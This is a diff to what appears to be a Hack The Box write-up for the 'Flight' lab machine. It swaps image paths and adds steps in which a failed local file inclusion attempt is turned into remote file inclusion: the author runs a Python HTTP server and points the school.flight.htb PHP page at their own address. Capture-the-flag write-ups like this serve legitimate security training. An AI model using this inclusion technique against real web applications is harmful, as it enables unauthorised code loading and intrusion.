@@ -206,7 +206,7 @@ We locate an extra subdomain!&#x20;
 * Add to /etc/hosts
 * school.flight.htb
 
-<figure><img src="../../../.gitbook/assets/image (2) (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 * svc\_apache user
 * postmaster@localhost
@@ -233,13 +233,35 @@ flight.htb:
 
 school.flight.htb:
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (11).png" alt=""><figcaption></figcaption></figure>
 
 I see a PHP page that calls a script. Let's test if this is injectable by simply attempting an LFI attack.
 
 <figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
 
 We see that we trigger a warning as soon as we try this! This is good! Let's see if we can bypass this now.
+
+After testing a variety of LFI bypasses with no luck, I decided to go a different route.&#x20;
+
+Why not try RFI?
+
+#### Start Local HTTP Server
+
+```
+python3 -m http.server
+```
+
+#### Trigger RFI Attempt
+
+```
+http://10.10.14.38:8000
+```
+
+BOOM! We get my Nmap scans that are in my /HTB/Escape directory for this challenge!
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+This means that we can exploit this!
 
 ### Port 445 - SMB
 
